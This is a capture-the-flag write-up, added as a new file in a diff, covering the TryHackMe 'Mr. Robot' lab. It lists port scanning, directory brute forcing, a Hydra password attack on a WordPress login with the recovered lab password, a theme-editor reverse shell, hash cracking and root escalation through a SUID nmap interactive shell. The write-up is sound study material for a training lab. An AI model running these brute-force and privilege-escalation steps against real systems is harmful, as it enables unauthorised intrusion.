@@ -1,0 +1,80 @@
+🤖 TryHackMe – Mr. Robot CTF (Medium | Linux)
+📌 Overview
+Machine Name: Mr. Robot CTF
+Difficulty: Medium
+Platform: TryHackMe
+Type: Linux / Web
+🔍 Enumeration
+🔹 Nmap Scan
+nmap -sV <IP>
+🔹 Findings
+22/tcp → SSH
+80/tcp → HTTP
+443/tcp → HTTPS
+🌐 Web Enumeration
+🔹 robots.txt
+http://<IP>/robots.txt
+🔹 Discovered Files
+key-1-of-3.txt ✅
+fsocity.dic (wordlist)
+🔹 Directory Bruteforce
+gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
+🔹 Findings
+/wp-login.php
+🔐 Credential Discovery
+🔹 User Enumeration (Hydra)
+Discovered valid username:
+elliot
+🔹 Password Bruteforce
+hydra -l elliot -P fsocity.dic <IP> http-post-form
+🔹 Credentials Found
+Username: elliot
+Password: ER28-0652
+💣 Initial Access (WordPress Exploitation)
+Logged into WordPress
+Identified Theme Editor vulnerability
+Injected reverse shell
+🐚 Shell Access
+Gained shell access as low-privileged user
+🔎 Post Exploitation
+🔹 Sensitive Data
+
+Found:
+
+robot : <password hash>
+Cracked the hash → obtained robot credentials
+🔐 SSH Access
+ssh robot@<IP>
+🔹 Flag
+key-2-of-3.txt ✅
+🔐 Privilege Escalation
+🔹 SUID Enumeration
+find / -perm -4000 -type f 2>/dev/null
+🔹 Interesting Binary
+/usr/local/bin/nmap
+🔹 Exploitation (Nmap Interactive Mode)
+/usr/local/bin/nmap --interactive
+
+Then:
+
+!sh
+
+💥 Root shell obtained
+
+👑 Root Access
+🔹 Final Flag
+find / -name key-3-of-3.txt
+
+Found:
+
+/root/key-3-of-3.txt
+🏁 Conclusion
+
+Successfully:
+
+Enumerated services and web directories
+Discovered credentials via brute force
+Exploited WordPress vulnerability
+Gained shell access
+Performed privilege escalation using SUID misconfiguration
+Achieved root access ✅
